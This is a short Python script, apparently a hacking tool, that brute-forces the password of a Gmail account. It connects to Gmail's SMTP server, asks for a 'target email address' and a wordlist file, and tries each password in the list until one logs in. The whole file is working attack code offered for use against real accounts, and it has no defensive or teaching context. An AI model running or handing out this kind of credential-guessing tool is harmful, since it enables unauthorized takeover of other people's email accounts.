# for email services they use smtp protocols

import smtplib

from termcolor import colored
# creating smtp session
s=smtplib.SMTP('smtp.gmail.com',587)
s.ehlo()
# start tls for security
# tls=transport layer security to encrpt the commands we send
s.starttls()
user=input("[*] Enter the target email address: ")
password_file=input("[*] Enter the path to the file:")
with open(password_file,"r") as file:
    passwords=file.read()

passlist=passwords.strip("\n").split("\n")

for password in passlist:
    try:
        # AUTHENTICATION
        
        s.login(user,password)
        print(colored(f"[+] Password found: {password}",'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored(f"[-] Password not matched : {password}",'red'))




